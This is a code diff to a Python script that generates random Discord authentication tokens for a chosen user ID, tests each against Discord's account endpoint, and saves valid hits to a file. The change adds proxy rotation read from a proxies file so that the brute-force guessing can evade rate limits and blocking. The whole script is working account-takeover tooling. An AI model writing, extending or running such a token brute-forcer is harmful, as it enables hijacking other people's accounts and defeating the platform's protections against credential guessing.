@@ -9,6 +9,7 @@ from colorama import Fore, init, Style
 def print_colored(text, color_code):
     print(f"\033[{color_code}m{text}\033[0m")
 
+# Check and install required libraries
 try:
     import requests
 except ImportError:
@@ -39,12 +40,27 @@ def get_token(user_id):
     token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
     return token
 
-def check_token_validity(token):
+def check_proxy(proxy):
+    try:
+        requests.get('https://www.google.com', proxies={'http': proxy, 'https': proxy}, timeout=5)
+        return True
+    except requests.RequestException:
+        return False
+
+def check_token_validity(token, proxy):
     headers = {
         'Authorization': token,
     }
     try:
-        login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
+        if proxy:
+            if check_proxy(proxy):
+                login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, proxies={'http': proxy, 'https': proxy})
+            else:
+                print(f"{Fore.RED}[-] Proxy not working, skipping token check.{Fore.RESET}")
+                return
+        else:
+            login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
+
         if login.status_code == 200:
             print(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
             with open('hit.txt', "a+") as f:
@@ -55,6 +71,11 @@ def check_token_validity(token):
         print(f"{Fore.RED}[-] ERROR OCCURRED {token}")
         print(f"Error details: {e}")
 
+def read_proxies_from_file(file_path):
+    with open(file_path, 'r') as file:
+        proxies = [line.strip() for line in file if line.strip()]
+    return proxies
+
 def print_banner():
     banner = (Fore.MAGENTA + """
 ██   ██ ███████ ██████  ███    ███ ██ ███████ 
@@ -62,8 +83,7 @@ def print_banner():
 ███████ █████   ██████  ██ ████ ██ ██ ███████ 
 ██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
 ██   ██ ███████ ██   ██ ██      ██ ██ ███████ 
-                                              
-    """ + Fore.LIGHTCYAN_EX)
+""" + Fore.LIGHTCYAN_EX)
     print(banner)
 
 def main():
@@ -76,24 +96,44 @@ def main():
 
     # Input validation
     while True:
-     try:
-        num_tokens_to_generate = int(input(
-            f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY TOKENS  : {Fore.MAGENTA}"))
-        user_id = input(
-            f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    USER ID  : {Fore.MAGENTA}")
+        try:
+            num_tokens_to_generate = int(input(
+                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY TOKENS  : {Fore.MAGENTA}"))
+            user_id = input(
+                f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    USER ID  : {Fore.MAGENTA}")
 
-        if not user_id.isdigit():
-            raise ValueError
-        break
+            if not user_id.isdigit():
+                raise ValueError
+            break
 
-     except ValueError:
-        print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")
+        except ValueError:
+            print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")
+
+    # Ask the user if they want to use proxies
+    use_proxies = input(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Use Proxies? (y/n)  : {Fore.MAGENTA}").lower() == 'y'
+    proxies = []
+
+    # If using proxies, read proxies from file
+    if use_proxies:
+        proxy_file_path = 'proxies.txt'
+        proxies = read_proxies_from_file(proxy_file_path)
+
+        # Check if proxies are working
+        working_proxies = [proxy for proxy in proxies if check_proxy(proxy)]
+
+        if not working_proxies:
+            print(f"{Fore.RED}No working proxies found. Exiting.{Fore.RESET}")
+            return
+        else:
+            print(f"{Fore.GREEN}[+] Proxies are working.{Fore.RESET}")
+            proxies = working_proxies
 
     clear_console()
 
     for _ in range(num_tokens_to_generate):
         token = get_token(user_id)
-        check_token_validity(token)
+        proxy = random.choice(proxies) if use_proxies else None
+        check_token_validity(token, proxy)
 
     time.sleep(1.5)
     clear_console()
